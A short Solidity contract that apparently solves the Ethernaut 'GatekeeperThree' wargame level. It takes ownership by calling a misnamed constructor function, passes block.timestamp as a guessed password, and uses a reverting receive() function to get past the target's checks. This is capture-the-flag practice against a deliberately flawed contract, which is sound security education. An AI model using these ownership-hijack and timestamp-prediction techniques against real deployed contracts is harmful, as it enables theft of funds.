// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external; 
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external returns (bool entered);
}

contract OpenGateThree {

    function openGateThree(address payable gate) external payable {
        IGatekeeperThree(gate).construct0r();
        IGatekeeperThree(gate).createTrick();
        IGatekeeperThree(gate).getAllowance(block.timestamp);

        (bool result, bytes memory data) = gate.call{value: msg.value}("");

        IGatekeeperThree(gate).enter();
    }

    receive() external payable {
        revert();
    }

}
